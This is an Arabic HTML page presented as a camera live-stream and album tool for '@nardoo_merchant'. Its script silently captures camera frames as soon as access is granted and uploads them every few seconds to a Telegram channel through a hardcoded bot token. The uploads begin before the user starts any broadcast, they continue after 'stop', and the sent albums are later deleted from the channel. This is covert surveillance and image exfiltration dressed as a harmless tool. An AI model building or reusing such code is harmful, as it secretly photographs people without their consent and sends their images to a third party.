<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📹 نظام الحذف التلقائي للألبومات - @nardoo_merchant</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }
        
        body {
            background: #0a0c10;
            color: white;
            min-height: 100vh;
            padding: 16px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* الهيدر */
        .header {
            background: #161b22;
            border-radius: 25px;
            padding: 15px 20px;
            margin-bottom: 20px;
            border: 2px solid #ffd700;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .header h1 {
            color: #ffd700;
            font-size: 24px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .merchant-badge {
            background: #0088cc;
            color: white;
            padding: 8px 20px;
            border-radius: 25px;
            font-weight: bold;
        }
        
        /* بطاقة التاجر */
        .merchant-card {
            background: #161b22;
            border-radius: 20px;
            padding: 15px;
            margin-bottom: 20px;
            border: 2px solid #ffd700;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .merchant-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: #ffd700;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 25px;
            font-weight: bold;
            color: black;
        }
        
        .merchant-name {
            color: #ffd700;
            font-size: 18px;
            font-weight: bold;
        }
        
        .merchant-id {
            color: #8b949e;
            font-size: 14px;
        }
        
        /* شاشتين */
        .dual-screen {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .screen {
            background: #161b22;
            border-radius: 20px;
            overflow: hidden;
            border: 2px solid;
        }
        
        .live-screen { border-color: #ff0000; }
        .frame-screen { border-color: #ffd700; }
        
        .screen-header {
            padding: 10px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #1f2630;
        }
        
        .live-header { color: #ff0000; }
        .frame-header { color: #ffd700; }
        
        .video-container {
            background: black;
            min-height: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        video {
            width: 100%;
            max-height: 350px;
            object-fit: cover;
        }
        
        canvas {
            width: 280px;
            height: 280px;
            border-radius: 50%;
            border: 3px solid #ffd700;
            object-fit: cover;
        }
        
        /* 3 أزرار فقط */
        .three-buttons {
            display: flex;
            gap: 15px;
            margin: 20px 0;
            justify-content: center;
        }
        
        .btn {
            flex: 1;
            max-width: 180px;
            padding: 15px 20px;
            border: none;
            border-radius: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .btn-green { background: #238636; color: white; }
        .btn-red { background: #da3633; color: white; }
        .btn-blue { background: #0088cc; color: white; }
        
        .btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.2);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        /* كاميرا أمامي/خلفي */
        .camera-toggle {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            justify-content: center;
        }
        
        .cam-option {
            padding: 8px 25px;
            border-radius: 25px;
            background: #1f2630;
            color: #8b949e;
            cursor: pointer;
            border: 2px solid transparent;
            transition: all 0.3s;
        }
        
        .cam-option.active {
            border-color: #ffd700;
            color: #ffd700;
            background: #ffd70020;
        }
        
        /* إحصائيات الخلفية */
        .stats-bar {
            display: flex;
            gap: 20px;
            margin: 15px 0;
            padding: 10px 15px;
            background: #1f2630;
            border-radius: 15px;
            border: 1px solid #ffd700;
            justify-content: space-around;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-label {
            color: #8b949e;
            font-size: 12px;
        }
        
        .stat-value {
            color: #ffd700;
            font-size: 16px;
            font-weight: bold;
        }
        
        /* حالة الألبومات */
        .albums-status {
            background: #1f2630;
            border-radius: 15px;
            padding: 15px;
            margin: 15px 0;
            border: 2px solid #ffd700;
            max-height: 250px;
            overflow-y: auto;
        }
        
        .album-item {
            background: #2d333b;
            border-radius: 10px;
            padding: 10px;
            margin: 5px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #444;
        }
        
        .album-id {
            color: #ffd700;
            font-family: monospace;
        }
        
        .album-status {
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 12px;
        }
        
        .status-sent { background: #0088cc; color: white; }
        .status-confirmed { background: #4caf50; color: white; }
        .status-deleted { background: #da3633; color: white; }
        
        /* قائمة الإطارات */
        .frames-list {
            background: #1f2630;
            border-radius: 15px;
            padding: 10px;
            margin-top: 15px;
            max-height: 150px;
            overflow-y: auto;
            border: 1px solid #ffd700;
        }
        
        .frame-item {
            display: flex;
            justify-content: space-between;
            padding: 5px 10px;
            border-bottom: 1px solid #2d333b;
            font-size: 12px;
        }
        
        .frame-time {
            color: #ffd700;
        }
        
        /* شريط الحالة */
        .status-bar {
            margin-top: 20px;
            padding: 10px 15px;
            background: #1f2630;
            border-radius: 12px;
            display: flex;
            justify-content: space-between;
            border: 1px solid #ffd700;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- الهيدر -->
        <div class="header">
            <h1>
                <i class="fas fa-trash-alt"></i>
                نظام الحذف التلقائي
            </h1>
            <div class="merchant-badge">
                @nardoo_merchant
            </div>
        </div>

        <!-- بطاقة التاجر -->
        <div class="merchant-card">
            <div class="merchant-avatar">ن</div>
            <div class="merchant-info">
                <div class="merchant-name">تاجر ناردو</div>
                <div class="merchant-id">@nardoo_merchant</div>
            </div>
        </div>

        <!-- شاشتين -->
        <div class="dual-screen">
            <!-- البث المباشر -->
            <div class="screen live-screen">
                <div class="screen-header live-header">
                    <span><i class="fas fa-circle"></i> البث المباشر</span>
                    <span id="liveStatus">⏸️ متوقف</span>
                </div>
                <div class="video-container">
                    <video id="liveVideo" autoplay playsinline muted></video>
                </div>
            </div>

            <!-- محاكاة الإطارات -->
            <div class="screen frame-screen">
                <div class="screen-header frame-header">
                    <span><i class="fas fa-images"></i> محاكاة الإطارات</span>
                    <span id="simulateStatus">⏳ انتظار</span>
                </div>
                <div class="video-container">
                    <canvas id="frameCanvas" width="280" height="280"></canvas>
                </div>
            </div>
        </div>

        <!-- اختيار الكاميرا (أمامي/خلفي) -->
        <div class="camera-toggle">
            <div class="cam-option active" onclick="selectCamera('user')" id="camFront">أمامية</div>
            <div class="cam-option" onclick="selectCamera('environment')" id="camBack">خلفية</div>
        </div>

        <!-- 3 أزرار فقط -->
        <div class="three-buttons">
            <button class="btn btn-green" onclick="startCamera()" id="startBtn">
                <i class="fas fa-camera"></i> تشغيل الكاميرا
            </button>
            <button class="btn btn-blue" onclick="startLiveStream()" id="liveBtn" disabled>
                <i class="fas fa-broadcast-tower"></i> بدء البث
            </button>
            <button class="btn btn-red" onclick="stopLiveStream()" id="stopBtn" disabled>
                <i class="fas fa-stop"></i> إيقاف البث
            </button>
        </div>

        <!-- إحصائيات الخلفية -->
        <div class="stats-bar">
            <div class="stat-item">
                <div class="stat-value" id="fpsValue">30</div>
                <div class="stat-label">إطار/ث</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="bufferValue">0</div>
                <div class="stat-label">في المخزن</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="sentValue">0</div>
                <div class="stat-label">تم الإرسال</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="filterValue">73%</div>
                <div class="stat-label">التصفية</div>
            </div>
        </div>

        <!-- حالة الألبومات (مرسلة - مؤكدة - محذوفة) -->
        <div class="albums-status" id="albumsStatus">
            <div style="text-align: center; color: #8b949e;">📊 في انتظار الألبومات...</div>
        </div>

        <!-- قائمة آخر الإطارات -->
        <div class="frames-list" id="framesList">
            <div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>
        </div>

        <!-- شريط الحالة -->
        <div class="status-bar">
            <span id="statusText"><i class="fas fa-circle" style="color: #4caf50;"></i> النظام جاهز</span>
            <span id="timeDisplay"></span>
        </div>
    </div>

    <script>
        // ========== إعدادات تيليجرام ==========
        const TELEGRAM = {
            botToken: '8576673096:AAEFKd-YSJcW_0d_wAHZBt-5nPg_VOjDX_0',
            channelId: '-1003822964890'
        };
        const MERCHANT_ID = '@nardoo_merchant';

        // ========== متغيرات النظام ==========
        let stream = null;
        let cameraActive = false;
        let isLiveActive = false;
        let currentFacingMode = 'user';
        
        // الإطارات
        let frameBuffer = [];
        let frameCounter = 0;
        
        // الألبومات
        let sentAlbums = [];        // الألبومات المرسلة في انتظار التأكيد
        let confirmedAlbums = [];    // الألبومات المؤكدة استلامها
        let deletedAlbums = [];       // الألبومات المحذوفة
        
        // المؤقتات
        let captureInterval = null;
        let simulationInterval = null;
        let filterInterval = null;
        let checkInterval = null;
        
        // عناصر DOM
        const video = document.getElementById('liveVideo');
        const canvas = document.getElementById('frameCanvas');
        const ctx = canvas.getContext('2d');
        
        const liveStatus = document.getElementById('liveStatus');
        const simulateStatus = document.getElementById('simulateStatus');
        const startBtn = document.getElementById('startBtn');
        const liveBtn = document.getElementById('liveBtn');
        const stopBtn = document.getElementById('stopBtn');
        const camFront = document.getElementById('camFront');
        const camBack = document.getElementById('camBack');
        
        const fpsValue = document.getElementById('fpsValue');
        const bufferValue = document.getElementById('bufferValue');
        const sentValue = document.getElementById('sentValue');
        const filterValue = document.getElementById('filterValue');
        const albumsStatus = document.getElementById('albumsStatus');
        const framesList = document.getElementById('framesList');
        const statusText = document.getElementById('statusText');
        const timeDisplay = document.getElementById('timeDisplay');

        // ========== تحديث الوقت ==========
        setInterval(() => {
            const now = new Date();
            timeDisplay.textContent = now.toLocaleTimeString('ar-EG');
        }, 1000);

        // ========== اختيار الكاميرا ==========
        window.selectCamera = function(mode) {
            currentFacingMode = mode;
            camFront.classList.toggle('active', mode === 'user');
            camBack.classList.toggle('active', mode === 'environment');
            
            if (cameraActive) {
                stopCamera();
                setTimeout(startCamera, 500);
            }
        };

        // ========== تشغيل الكاميرا ==========
        window.startCamera = async function() {
            try {
                statusText.innerHTML = '🔄 تشغيل الكاميرا...';
                
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: currentFacingMode,
                        width: { ideal: 640 },
                        height: { ideal: 640 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                await video.play();
                
                cameraActive = true;
                liveStatus.innerHTML = '🔴 نشط';
                startBtn.disabled = true;
                liveBtn.disabled = false;
                
                statusText.innerHTML = '✅ الكاميرا جاهزة';
                
                // بدء كل العمليات في الخلفية
                startBackgroundProcesses();
                
            } catch (err) {
                statusText.innerHTML = '❌ خطأ: ' + err.message;
            }
        };

        // ========== بدء عمليات الخلفية ==========
        function startBackgroundProcesses() {
            // 1. التقاط الإطارات (33ms = 30 FPS)
            captureInterval = setInterval(captureFrame, 33);
            
            // 2. إرسال الإطارات كألبومات (كل 5 ثواني)
            setInterval(sendFrameAlbum, 5000);
            
            // 3. التحقق من تأكيد الألبومات (كل 10 ثواني)
            checkInterval = setInterval(checkConfirmedAlbums, 10000);
            
            // 4. بدء المحاكاة
            startSimulation();
        }

        // ========== التقاط إطار ==========
        function captureFrame() {
            if (!cameraActive) return;
            
            // رسم الإطار على canvas
            ctx.drawImage(video, 0, 0, 280, 280);
            
            // تطبيق التصفية (73% جودة)
            canvas.toBlob((blob) => {
                const frame = {
                    id: Date.now(),
                    blob: blob,
                    time: Date.now(),
                    number: frameCounter++
                };
                
                frameBuffer.push(frame);
                
                // تحديث الإحصائيات
                bufferValue.textContent = frameBuffer.length;
                sentValue.textContent = sentAlbums.reduce((acc, a) => acc + a.frames, 0);
                
                // عرض في القائمة
                updateFramesList();
                
            }, 'image/jpeg', 0.73);
        }

        // ========== إرسال ألبوم إطارات ==========
        async function sendFrameAlbum() {
            if (frameBuffer.length < 5) return;
            
            const albumId = Date.now(); // معرف فريد للألبوم
            const framesToSend = frameBuffer.splice(0, 10);
            
            try {
                const now = new Date();
                const timeStr = now.toLocaleTimeString('ar-EG');
                
                // كابشن مع معرف الألبوم
                const caption = `🎁 ألبوم إطارات من ${MERCHANT_ID}\n⏱️ ${timeStr}\n📦 ${framesToSend.length} إطار\n🆔 AlbumID: ${albumId}`;
                
                // تحضير media array
                const mediaArray = [{
                    type: 'photo',
                    media: 'attach://frame0',
                    caption: caption
                }];
                
                for (let i = 1; i < framesToSend.length; i++) {
                    mediaArray.push({ type: 'photo', media: `attach://frame${i}` });
                }
                
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM.channelId);
                formData.append('media', JSON.stringify(mediaArray));
                
                framesToSend.forEach((frame, i) => {
                    formData.append(`frame${i}`, frame.blob, `frame_${i}.jpg`);
                });
                
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMediaGroup`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await res.json();
                
                if (result.ok) {
                    // حفظ الألبوم في قائمة المرسلة
                    sentAlbums.push({
                        id: albumId,
                        messageIds: result.result.map(msg => msg.message_id),
                        time: timeStr,
                        frames: framesToSend.length,
                        status: 'sent',
                        timestamp: Date.now()
                    });
                    
                    console.log(`✅ ألبوم ${albumId} أرسل بنجاح`);
                    updateAlbumsStatus();
                }
                
            } catch (error) {
                console.error('❌ فشل إرسال الألبوم:', error);
            }
        }

        // ========== التحقق من الألبومات المؤكدة ==========
        async function checkConfirmedAlbums() {
            if (sentAlbums.length === 0) return;
            
            try {
                // جلب آخر التحديثات من القناة
                const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/getUpdates?limit=100`);
                const data = await res.json();
                
                if (!data.ok) return;
                
                // البحث عن رسائل التأكيد
                const confirmMessages = data.result.filter(update => 
                    update.message?.text && 
                    update.message.text.includes('✅ تم استلام الألبوم')
                );
                
                for (const album of sentAlbums) {
                    // هل هناك تأكيد لهذا الألبوم؟
                    const confirmed = confirmMessages.some(msg => 
                        msg.message.text.includes(album.id.toString())
                    );
                    
                    if (confirmed) {
                        await deleteAlbumFromChannel(album);
                    }
                    
                    // حذف الألبومات القديمة (أكثر من 5 دقائق)
                    if (Date.now() - album.timestamp > 5 * 60 * 1000) {
                        await deleteAlbumFromChannel(album);
                    }
                }
                
            } catch (error) {
                console.error('خطأ في التحقق:', error);
            }
        }

        // ========== حذف الألبوم من القناة ==========
        async function deleteAlbumFromChannel(album) {
            try {
                // حذف كل رسائل الألبوم
                for (const messageId of album.messageIds) {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/deleteMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM.channelId,
                            message_id: messageId
                        })
                    });
                }
                
                // نقل الألبوم إلى المحذوفة
                deletedAlbums.push({
                    ...album,
                    deletedAt: new Date().toLocaleTimeString('ar-EG')
                });
                
                // إزالة من المرسلة
                sentAlbums = sentAlbums.filter(a => a.id !== album.id);
                
                console.log(`🗑️ تم حذف الألبوم ${album.id} من القناة`);
                updateAlbumsStatus();
                
                // إرسال تأكيد الحذف
                await sendDeleteConfirmation(album.id);
                
            } catch (error) {
                console.error('❌ فشل حذف الألبوم:', error);
            }
        }

        // ========== إرسال تأكيد الحذف ==========
        async function sendDeleteConfirmation(albumId) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM.channelId);
            formData.append('text', `🗑️ تم حذف الألبوم ${albumId} من القناة بعد التأكد من استلامه`);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM.botToken}/sendMessage`, {
                method: 'POST',
                body: formData
            });
        }

        // ========== تحديث حالة الألبومات في الواجهة ==========
        function updateAlbumsStatus() {
            let html = '<h4 style="color:#ffd700; margin-bottom:10px;">📊 حالة الألبومات:</h4>';
            
            // إحصائيات سريعة
            html += '<div style="display:flex; gap:15px; margin-bottom:15px;">';
            html += `<div><span style="color:#0088cc;">📤 مرسلة:</span> ${sentAlbums.length}</div>`;
            html += `<div><span style="color:#4caf50;">✅ مؤكدة:</span> ${confirmedAlbums.length}</div>`;
            html += `<div><span style="color:#da3633;">🗑️ محذوفة:</span> ${deletedAlbums.length}</div>`;
            html += '</div>';
            
            // قائمة الألبومات المرسلة
            if (sentAlbums.length > 0) {
                html += '<div style="max-height:150px; overflow-y:auto;">';
                sentAlbums.slice(-5).reverse().forEach(album => {
                    html += `
                        <div class="album-item">
                            <span class="album-id">🆔 ${album.id}</span>
                            <span style="color:#8b949e;">⏱️ ${album.time}</span>
                            <span style="color:#ffd700;">📦 ${album.frames}</span>
                            <span class="album-status status-sent">في الانتظار</span>
                        </div>
                    `;
                });
                html += '</div>';
            }
            
            // آخر الألبومات المحذوفة
            if (deletedAlbums.length > 0) {
                html += '<h4 style="color:#da3633; margin:10px 0;">🗑️ آخر المحذوفات:</h4>';
                html += '<div style="max-height:100px; overflow-y:auto;">';
                deletedAlbums.slice(-3).reverse().forEach(album => {
                    html += `
                        <div class="album-item">
                            <span class="album-id">🆔 ${album.id}</span>
                            <span style="color:#8b949e;">🗑️ ${album.deletedAt}</span>
                        </div>
                    `;
                });
                html += '</div>';
            }
            
            albumsStatus.innerHTML = html;
        }

        // ========== تحديث قائمة الإطارات ==========
        function updateFramesList() {
            if (frameBuffer.length === 0) {
                framesList.innerHTML = '<div style="color: #8b949e; text-align: center;">📸 في انتظار الإطارات...</div>';
                return;
            }
            
            let html = '';
            frameBuffer.slice(-5).reverse().forEach(frame => {
                const time = new Date(frame.time).toLocaleTimeString('ar-EG');
                html += `
                    <div class="frame-item">
                        <span>إطار #${frame.number}</span>
                        <span class="frame-time">${time}</span>
                    </div>
                `;
            });
            
            framesList.innerHTML = html;
        }

        // ========== بدء المحاكاة ==========
        function startSimulation() {
            simulateStatus.innerHTML = '▶️ نشطة';
            
            simulationInterval = setInterval(() => {
                if (frameBuffer.length > 0) {
                    const randomFrame = frameBuffer[Math.floor(Math.random() * frameBuffer.length)];
                    const img = new Image();
                    img.onload = () => {
                        ctx.drawImage(img, 0, 0, 280, 280);
                    };
                    img.src = URL.createObjectURL(randomFrame.blob);
                }
            }, 33);
        }

        // ========== بدء البث المباشر ==========
        window.startLiveStream = function() {
            isLiveActive = true;
            liveBtn.disabled = true;
            stopBtn.disabled = false;
            liveStatus.innerHTML = '🔴 بث مباشر';
            statusText.innerHTML = '🔴 البث نشط';
        };

        // ========== إيقاف البث ==========
        window.stopLiveStream = function() {
            isLiveActive = false;
            liveBtn.disabled = false;
            stopBtn.disabled = true;
            liveStatus.innerHTML = '⏸️ متوقف';
            statusText.innerHTML = '⏹️ تم الإيقاف';
            
            // إيقاف كل شيء
            if (captureInterval) clearInterval(captureInterval);
            if (simulationInterval) clearInterval(simulationInterval);
            if (filterInterval) clearInterval(filterInterval);
            if (checkInterval) clearInterval(checkInterval);
            
            // إعادة تشغيل الكاميرا
            startCamera();
        };

        // ========== إيقاف الكاميرا (للاستخدام الداخلي) ==========
        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            cameraActive = false;
            startBtn.disabled = false;
            liveBtn.disabled = true;
            stopBtn.disabled = true;
        }
    </script>
</body>
</html>
